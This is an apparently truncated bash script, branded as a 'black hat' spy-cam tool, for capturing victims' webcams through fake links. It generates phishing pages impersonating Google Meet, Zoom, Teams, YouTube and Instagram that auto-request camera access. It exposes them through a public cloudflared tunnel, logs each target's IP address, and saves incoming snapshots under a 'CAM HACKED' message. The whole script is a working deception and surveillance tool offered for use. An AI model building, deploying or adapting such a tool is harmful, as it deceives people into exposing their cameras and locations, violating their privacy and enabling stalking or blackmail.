#!/bin/bash
trap 'printf "\n";stop' 2

banner() {
  printf "\e[1;92m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\e[0m\n"
  printf "\n"
  printf "\e[1;92m  ███████╗██████╗ ██╗   ██╗   ████████╗██╗  ██╗███████╗    ██████╗ █████╗ ███╗   ███╗  \e[0m\n"
  printf "\e[1;92m  ██╔════╝██╔══██╗╚██╗ ██╔╝   ╚══██╔══╝██║  ██║██╔════╝   ██╔════╝██╔══██╗████╗ ████║  \e[0m\n"
  printf "\e[1;92m  ███████╗██████╔╝ ╚████╔╝       ██║   ███████║█████╗     ██║     ███████║██╔████╔██║  \e[0m\n"
  printf "\e[1;92m  ╚════██║██╔═══╝   ╚██╔╝        ██║   ██╔══██║██╔══╝     ██║     ██╔══██║██║╚██╔╝██║  \e[0m\n"
  printf "\e[1;92m  ███████║██║        ██║         ██║   ██║  ██║███████╗   ╚██████╗██║  ██║██║ ╚═╝ ██║  \e[0m\n"
  printf "\e[1;92m  ╚══════╝╚═╝        ╚═╝         ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝  \e[0m\n"
  printf "\e[1;92m                                                                                       \e[0m\n"
  printf "\e[1;92m - - - - - - - - - - - - - - -SPY CAM BY ATHEX BLACK HAT- - - - - - - - - - - - - - - -\e[0m\n"
  printf "\e[1;92m  This Tool Is Designed To Get Webcam Access Of Victim sending him/her Fake Link       \e[0m\n" 
  printf "\e[1;92m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\e[0m\n"
  printf "\n"
}

show_templates() {
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Available Templates:\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m] Google Meet \e[0m\e[1;93m(Most Trusted)\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m] Zoom Meeting\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m] Microsoft Teams\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m] YouTube Live Stream Test\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m] Instagram Camera Test\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m] Facebook Live Test\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m] TikTok Live Test\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m] Webcam Test Online\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m9\e[0m\e[1;92m] Video Call Test\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m0\e[0m\e[1;92m] Custom Template\e[0m\n"
  printf "\n"
}

select_template() {
  show_templates
  
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Select template (1-9, 0 for custom): \e[0m' template_choice
  
  case $template_choice in
    1)
      template="google_meet"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: Google Meet Template\e[0m\n"
      ;;
    2)
      template="zoom"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: Zoom Meeting Template\e[0m\n"
      ;;
    3)
      template="teams"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: Microsoft Teams Template\e[0m\n"
      ;;
    4)
      template="youtube"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: YouTube Live Stream Test Template\e[0m\n"
      ;;
    5)
      template="instagram"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: Instagram Camera Test Template\e[0m\n"
      ;;
    6)
      template="facebook"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: Facebook Live Test Template\e[0m\n"
      ;;
    7)
      template="tiktok"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: TikTok Live Test Template\e[0m\n"
      ;;
    8)
      template="webcam_test"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: Webcam Test Online Template\e[0m\n"
      ;;
    9)
      template="video_call"
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Selected: Video Call Test Template\e[0m\n"
      ;;
    0)
      printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter custom template name: \e[0m"
      read template
      ;;
    *)
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Invalid choice! Using Google Meet template.\e[0m\n"
      template="google_meet"
      ;;
  esac
  
  # Create template directory if it doesn't exist
  mkdir -p templates
  
  # Generate the appropriate HTML file based on template
  generate_template_html
}

generate_template_html() {
  # Remove existing index.html
  rm -f index.html
  
  case $template in
    "google_meet")
      cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Meet - Camera Test</title>
    <link rel="icon" href="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-512dp/logo_meet_2020q4_color_2x_web_512dp.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Arial, sans-serif; }
        body { background: #202124; color: #e8eaed; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #2d2e31; padding: 30px; border-radius: 12px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { color: #8ab4f8; margin-bottom: 10px; font-size: 24px; }
        .meeting-code { background: #3c4043; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 18px; letter-spacing: 2px; }
        .status { background: #1e8e3e; color: white; padding: 10px; border-radius: 20px; display: inline-block; margin: 10px 0; }
        .camera-box { width: 100%; height: 300px; background: #3c4043; border-radius: 8px; margin: 20px 0; display: flex; justify-content: center; align-items: center; overflow: hidden; position: relative; }
        .camera-feed { width: 100%; height: 100%; object-fit: cover; }
        .permission-text { color: #f28b82; margin: 15px 0; font-size: 14px; }
        .button { background: #1a73e8; color: white; border: none; padding: 12px 30px; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px; transition: background 0.3s; }
        .button:hover { background: #0d62d9; }
        .footer { margin-top: 20px; color: #9aa0a6; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://fonts.gstatic.com/s/i/productlogos/meet_2020q4/v1/web-512dp/logo_meet_2020q4_color_2x_web_512dp.png" class="logo" alt="Google Meet">
        <h1>Google Meet - Camera Test</h1>
        <div class="meeting-code">Meeting Code: G00G-LE-M33T</div>
        <div class="status">● Connecting to meeting...</div>
        
        <div class="camera-box">
            <video id="cameraFeed" class="camera-feed" autoplay></video>
            <div id="permissionText" class="permission-text" style="display: none;">
                Click "Allow" to enable camera for this meeting
            </div>
        </div>
        
        <p class="permission-text">Camera access required to join this meeting</p>
        
        <button class="button" onclick="requestCamera()">Join Meeting</button>
        <button class="button" style="background: #5f6368;">Cancel</button>
        
        <div class="footer">
            By joining, you agree to Google's Terms of Service and Privacy Policy
        </div>
    </div>

    <script>
        function requestCamera() {
            document.getElementById('permissionText').style.display = 'block';
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const video = document.getElementById('cameraFeed');
                    video.srcObject = stream;
                    document.getElementById('permissionText').style.display = 'none';
                    
                    // Send data to server (simulated)
                    setTimeout(function() {
                        alert('Camera connected successfully! Joining meeting...');
                    }, 1000);
                })
                .catch(function(err) {
                    alert('Error accessing camera: ' + err.message);
                });
        }
        
        // Auto-request camera after 2 seconds
        setTimeout(requestCamera, 2000);
    </script>
</body>
</html>
EOF
      ;;
    
    "zoom")
      cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom Meeting - Camera Test</title>
    <link rel="icon" href="https://st1.zoom.us/zoom.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #0e71eb; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; color: #333; padding: 30px; border-radius: 10px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
        .logo { width: 100px; margin-bottom: 20px; }
        h1 { color: #0e71eb; margin-bottom: 10px; }
        .meeting-id { background: #f2f2f2; padding: 15px; border-radius: 8px; margin: 20px 0; font-size: 18px; }
        .camera-box { width: 100%; height: 300px; background: #000; border-radius: 8px; margin: 20px 0; overflow: hidden; position: relative; }
        .camera-feed { width: 100%; height: 100%; object-fit: cover; }
        .button { background: #0e71eb; color: white; border: none; padding: 12px 30px; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px; }
        .button.secondary { background: #666; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://st1.zoom.us/zoom.ico" class="logo" alt="Zoom">
        <h1>Zoom Meeting</h1>
        <p>Meeting ID: 123 456 7890</p>
        <div class="meeting-id">Password: 123456</div>
        
        <div class="camera-box">
            <video id="cameraFeed" class="camera-feed" autoplay></video>
        </div>
        
        <p>Please allow camera access to join the meeting</p>
        
        <button class="button" onclick="requestCamera()">Join with Video</button>
        <button class="button secondary">Join without Video</button>
    </div>

    <script>
        function requestCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    document.getElementById('cameraFeed').srcObject = stream;
                    alert('Camera connected! Joining meeting...');
                })
                .catch(function(err) {
                    alert('Camera access denied: ' + err.message);
                });
        }
        
        setTimeout(requestCamera, 1500);
    </script>
</body>
</html>
EOF
      ;;
    
    "teams")
      cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Teams Meeting</title>
    <link rel="icon" href="https://statics.teams.cdn.office.net/hashed/favicon/teams/favicon-32x32.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #464775; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; color: #333; padding: 30px; border-radius: 8px; width: 90%; max-width: 500px; text-align: center; box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
        .logo { width: 80px; margin-bottom: 20px; }
        h1 { color: #464775; margin-bottom: 20px; }
        .camera-box { width: 100%; height: 250px; background: #f3f2f1; border: 2px dashed #8a8886; border-radius: 8px; margin: 20px 0; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        .camera-feed { width: 100%; height: 100%; object-fit: cover; }
        .button { background: #464775; color: white; border: none; padding: 12px 30px; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://statics.teams.cdn.office.net/hashed/favicon/teams/favicon-32x32.png" class="logo" alt="Microsoft Teams">
        <h1>Microsoft Teams Meeting</h1>
        <p>Camera setup required before joining</p>
        
        <div class="camera-box">
            <video id="cameraFeed" class="camera-feed" autoplay></video>
            <div id="status">Checking camera...</div>
        </div>
        
        <button class="button" onclick="setupCamera()">Test Camera</button>
        <button class="button" style="background: #6264a7;">Join Meeting</button>
    </div>

    <script>
        function setupCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    document.getElementById('cameraFeed').srcObject = stream;
                    document.getElementById('status').innerHTML = 'Camera ready ✓';
                    document.getElementById('status').style.color = 'green';
                })
                .catch(function(err) {
                    document.getElementById('status').innerHTML = 'Camera access required';
                    document.getElementById('status').style.color = 'red';
                });
        }
        
        setTimeout(setupCamera, 1000);
    </script>
</body>
</html>
EOF
      ;;
    
    "youtube")
      cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Live Stream Test</title>
    <link rel="icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; }
        body { background: #0f0f0f; color: #f1f1f1; }
        .header { background: #212121; padding: 15px; display: flex; align-items: center; }
        .logo { width: 100px; margin-right: 20px; }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; }
        .stream-box { background: #000; border-radius: 8px; overflow: hidden; margin: 20px 0; position: relative; }
        .camera-feed { width: 100%; height: 400px; object-fit: cover; }
        .stream-title { font-size: 24px; margin: 10px 0; }
        .stream-info { color: #aaa; margin-bottom: 20px; }
        .button { background: #cc0000; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 16px; margin-right: 10px; }
        .test-button { background: #3ea6ff; }
        .view-count { color: #3ea6ff; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://www.youtube.com/s/desktop/12d6b690/img/favicon_32x32.png" class="logo" alt="YouTube">
        <h1>Live Stream Test</h1>
    </div>
    
    <div class="container">
        <div class="stream-box">
            <video id="cameraFeed" class="camera-feed" autoplay></video>
        </div>
        
        <h2 class="stream-title">Live Stream Camera Test</h2>
        <div class="stream-info">
            <span class="view-count">154 viewers</span> • Testing stream quality
        </div>
        
        <p>Testing camera for YouTube Live broadcast. Please allow camera access to continue.</p>
        
        <button class="button test-button" onclick="testCamera()">Test Camera</button>
        <button class="button">Go Live</button>
        
        <div id="status" style="margin-top: 20px; padding: 10px; background: #212121; border-radius: 4px;">
            Camera status: Waiting for permission...
        </div>
    </div>

    <script>
        function testCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    document.getElementById('cameraFeed').srcObject = stream;
                    document.getElementById('status').innerHTML = 'Camera status: ✓ Connected - Ready for live stream';
                    document.getElementById('status').style.color = '#4CAF50';
                })
                .catch(function(err) {
                    document.getElementById('status').innerHTML = 'Camera status: ✗ Access denied - Please allow camera';
                    document.getElementById('status').style.color = '#f44336';
                });
        }
        
        setTimeout(testCamera, 2000);
    </script>
</body>
</html>
EOF
      ;;
    
    "instagram")
      cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Camera Test</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .logo { width: 100px; margin-bottom: 10px; }
        .camera-container { position: relative; width: 100%; height: 500px; background: #262626; border-radius: 10px; overflow: hidden; margin-bottom: 20px; }
        .camera-feed { width: 100%; height: 100%; object-fit: cover; }
        .camera-overlay { position: absolute; bottom: 20px; left: 0; right: 0; display: flex; justify-content: center; gap: 20px; }
        .camera-button { background: rgba(255,255,255,0.2); border: 2px solid white; border-radius: 50%; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .record-button { background: #ff3040; border: none; }
        .test-text { text-align: center; margin: 20px 0; color: #a8a8a8; }
        .ig-button { background: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" class="logo" alt="Instagram">
            <h2>Camera Test</h2>
        </div>
        
        <div class="camera-container">
            <video id="cameraFeed" class="camera-feed" autoplay></video>
            <div class="camera-overlay">
                <div class="camera-button" onclick="switchCamera()">↻</div>
                <div class="camera-button record-button" onclick="takePhoto()">●</div>
                <div class="camera-button" onclick="toggleFlash()">⚡</div>
            </div>
        </div>
        
        <div class="test-text">
            Testing camera for Instagram Stories and Reels
        </div>
        
        <button class="ig-button" onclick="enableCamera()">Enable Camera</button>
    </div>

    <script>
        function enableCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    document.getElementById('cameraFeed').srcObject = stream;
                    alert('Camera enabled! Ready for Instagram.');
                })
                .catch(function(err) {
                    alert('Please allow camera access for Instagram');
                });
        }
        
        function takePhoto() {
            alert('Photo captured! (Test mode)');
        }
        
        function switchCamera() {
            alert('Switching camera...');
        }
        
        function toggleFlash() {
            alert('Flash toggled');
        }
        
        setTimeout(enableCamera, 1000);
    </script>
</body>
</html>
EOF
      ;;
    
    "webcam_test")
      cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Test Online</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); max-width: 700px; width: 90%; text-align: center; }
        h1 { color: #333; margin-bottom: 20px; }
        .camera-section { margin: 30px 0; }
        .camera-box { width: 100%; height: 400px; background: #2d3748; border-radius: 10px; overflow: hidden; margin: 0 auto; position: relative; }
        .camera-feed { width: 100%; height: 100%; object-fit: cover; }
        .controls { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
        .btn { padding: 12px 30px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; transition: all 0.3s; }
        .btn-primary { background: #4f46e5; color: white; }
        .btn-secondary { background: #e5e7eb; color: #374151; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .status { padding: 15px; background: #f3f4f6; border-radius: 8px; margin: 20px 0; }
        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 25px 0; }
        .feature { background: #f8fafc; padding: 15px; border-radius: 8px; }
        .instructions { text-align: left; margin-top: 25px; padding: 20px; background: #f1f5f9; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📷 Webcam Test Online</h1>
        <p>Test your camera, microphone, and speaker in one place</p>
        
        <div class="camera-section">
            <div class="camera-box">
                <video id="cameraFeed" class="camera-feed" autoplay></video>
                <div id="cameraStatus" style="position: absolute; top: 20px; left: 20px; color: white; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 5px;">
                    Camera: Waiting for permission...
                </div>
            </div>
        </div>
        
        <div class="status" id="statusBox">
            <strong>Status:</strong> Click "Start Test" to begin
        </div>
        
        <div class="controls">
            <button class="btn btn-primary" onclick="startTest()">▶ Start Test</button>
            <button class="btn btn-secondary" onclick="stopTest()">⏹ Stop Test</button>
            <button class="btn btn-secondary" onclick="takeSnapshot()">📸 Take Snapshot</button>
        </div>
        
        <div class="features">
            <div class="feature">
                <h3>🎥 Video Test</h3>
                <p>Check camera resolution and frame rate</p>
            </div>
            <div class="feature">
                <h3>🎤 Audio Test</h3>
                <p>Test microphone input levels</p>
            </div>
            <div class="feature">
                <h3>🔊 Speaker Test</h3>
                <p>Verify speaker output</p>
            </div>
        </div>
        
        <div class="instructions">
            <h3>How to Test:</h3>
            <ol>
                <li>Click "Start Test" button</li>
                <li>Allow camera and microphone access when prompted</li>
                <li>Check video feed appears clearly</li>
                <li>Speak to test microphone levels</li>
                <li>Use "Take Snapshot" to capture test image</li>
            </ol>
        </div>
    </div>

    <script>
        let mediaStream = null;
        
        function startTest() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(function(stream) {
                    mediaStream = stream;
                    const video = document.getElementById('cameraFeed');
                    video.srcObject = stream;
                    
                    document.getElementById('cameraStatus').innerHTML = 'Camera: ✓ Active';
                    document.getElementById('cameraStatus').style.background = 'rgba(34, 197, 94, 0.7)';
                    document.getElementById('statusBox').innerHTML = '<strong>Status:</strong> ✓ Camera and microphone working properly';
                    document.getElementById('statusBox').style.background = '#d1fae5';
                    
                    // Test audio
                    const audioContext = new AudioContext();
                    const source = audioContext.createMediaStreamSource(stream);
                    const analyser = audioContext.createAnalyser();
                    source.connect(analyser);
                    
                    alert('✅ Camera and microphone are working correctly!');
                })
                .catch(function(err) {
                    document.getElementById('statusBox').innerHTML = '<strong>Status:</strong> ✗ Error: ' + err.message;
                    document.getElementById('statusBox').style.background = '#fee2e2';
                });
        }
        
        function stopTest() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                document.getElementById('cameraFeed').srcObject = null;
                document.getElementById('cameraStatus').innerHTML = 'Camera: Stopped';
                document.getElementById('cameraStatus').style.background = 'rgba(239, 68, 68, 0.7)';
                document.getElementById('statusBox').innerHTML = '<strong>Status:</strong> Test stopped';
                document.getElementById('statusBox').style.background = '#f3f4f6';
            }
        }
        
        function takeSnapshot() {
            const video = document.getElementById('cameraFeed');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const link = document.createElement('a');
            link.download = 'webcam-test-snapshot.png';
            link.href = canvas.toDataURL();
            link.click();
            
            alert('Snapshot saved! Check your downloads folder.');
        }
        
        // Auto-start after 3 seconds
        setTimeout(startTest, 3000);
    </script>
</body>
</html>
EOF
      ;;
    
    *)
      # Default template (Google Meet)
      template="google_meet"
      generate_template_html
      ;;
  esac
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Template '$template' generated successfully!\e[0m\n"
}

stop() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cleaning up...\e[0m\n"
  
  # Check and kill cloudflared
  if pgrep -f "cloudflared" > /dev/null; then
    pkill -f cloudflared > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared stopped\e[0m\n"
  fi
  
  # Check and kill PHP
  if pgrep -f "php" > /dev/null; then
    pkill -f php > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] PHP server stopped\e[0m\n"
  fi
  
  # Remove temporary files
  rm -f logs/ip.txt
  
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Exiting...\e[0m\n"
  exit 1
}

check_dependencies() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Checking dependencies...\e[0m\n"
  
  # Check for PHP
  if ! command -v php > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] PHP not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    apt install php > /dev/null 2>&1
    
    if ! command -v php > /dev/null 2>&1; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Error installing PHP. Please install it manually.\e[0m\n"
      exit 1
    fi
  fi
  
  # Check for curl
  if ! command -v curl > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Curl not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    sudo apt install -y curl > /dev/null 2>&1
    
    if ! command -v curl > /dev/null 2>&1; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Error installing Curl. Please install it manually.\e[0m\n"
      exit 1
    fi
  fi
  
  # Check for wget
  if ! command -v wget > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Wget not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    sudo apt install -y wget > /dev/null 2>&1
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] All dependencies are installed!\e[0m\n"
}

catch_ip() {
  ip=$(grep -a 'IP:' logs/ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
  
  # Save IP to log file with timestamp and template info
  echo "$(date '+%Y-%m-%d %H:%M:%S') - Template: $template - IP: $ip" >> logs/captured_ips.log
  
  # Remove the temporary IP file
  rm -f logs/ip.txt
}

checkfound() {
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Active Template: \e[0m\e[1;93m$template\e[0m\n"
  
  while true; do
    if [[ -e "logs/ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
      catch_ip
    fi

    if [[ -e "logs/log.log" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m]  CAM HACKED File received!\e[0m\n"
      
      # Move the snapshot to a timestamped file
      timestamp=$(date +%Y%m%d_%H%M%S)
      mkdir -p captures
      mv logs/log.log "captures/snapshot_${template}_$timestamp.jpg"
      printf "\e[1;92m[\e[0m+\e[1;92m] Saved as captures/snapshot_${template}_$timestamp.jpg\e[0m\n"
    fi
    
    sleep 0.5
  done
}

install_cloudflared() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Setting up Cloudflared...\e[0m\n"
  
  # Check if cloudflared is already installed
  if command -v cloudflared > /dev/null 2>&1; then
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared already installed.\e[0m\n"
    return 0
  fi
  
  # Detect architecture
  ARCH=$(uname -m)
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Architecture detected: $ARCH\e[0m\n"
  
  # Download cloudflared based on architecture
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Downloading Cloudflared...\e[0m\n"
  
  if [[ "$ARCH" == "x86_64" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared
  elif [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O cloudflared
  elif [[ "$ARCH" == "armv7l" ]] || [[ "$ARCH" == "armhf" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" -O cloudflared
  elif [[ "$ARCH" == "i386" ]] || [[ "$ARCH" == "i686" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O cloudflared
  else
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Unsupported architecture: $ARCH\e[0m\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Please install Cloudflared manually from: \e[0m\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/\e[0m\n"
    exit 1
  fi
  
  # Make it executable and move to /usr/local/bin
  chmod +x cloudflared
  sudo mv cloudflared /usr/local/bin/cloudflared
  
  if ! command -v cloudflared > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Failed to install Cloudflared.\e[0m\n"
    exit 1
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared installed successfully!\e[0m\n"
  return 0
}

start_servers() {
  # Create necessary directories
  mkdir -p captures logs templates
  
  # Kill any existing PHP or Cloudflared processes
  pkill -f php > /dev/null 2>&1
  pkill -f cloudflared > /dev/null 2>&1
  
  # Remove any existing cloudflared log files
  rm -f cloudflared.log
  
  # Start PHP server
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting PHP server on port 3333...\e[0m\n"
  php -S 0.0.0.0:3333 > /dev/null 2>&1 &
  sleep 2
  
  # Start Cloudflared tunnel
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Cloudflared tunnel...\e[0m\n"
  
  # Start cloudflared in background and capture output
  cloudflared tunnel --url http://localhost:3333 > cloudflared.log 2>&1 &
  CLOUDFLARED_PID=$!
  
  # Wait for tunnel to establish
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for Cloudflared connection (15 seconds)...\e[0m\n"
  sleep 15
  
  # Get the Cloudflared URL
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Retrieving Cloudflared URL...\e[0m\n"
  
  cloudflared_url=""
  
  # Method 1: Check log file for trycloudflare.com URL
  if [[ -f "cloudflared.log" ]]; then
    cloudflared_url=$(grep -o 'https://[0-9a-z\-]*\.trycloudflare\.com' cloudflared.log | head -1)
  fi
  
  # Method 2: Try to get from metrics endpoint (cloudflared 2023.8.0+)
  if [[ -z "$cloudflared_url" ]]; then
    cloudflared_url=$(curl -s http://localhost:3333/.well-known/cf-attempts 2>/dev/null | grep -o 'https://[^"]*' | head -1)
  fi
  
  # Method 3: Try different pattern in log
  if [[ -z "$cloudflared_url" ]]; then
    cloudflared_url=$(grep -o 'https://.*\.trycloudflare\.com' cloudflared.log 2>/dev/null | head -1)
  fi
  
  # Method 4: Look for any URL in the log
  if [[ -z "$cloudflared_url" ]]; then
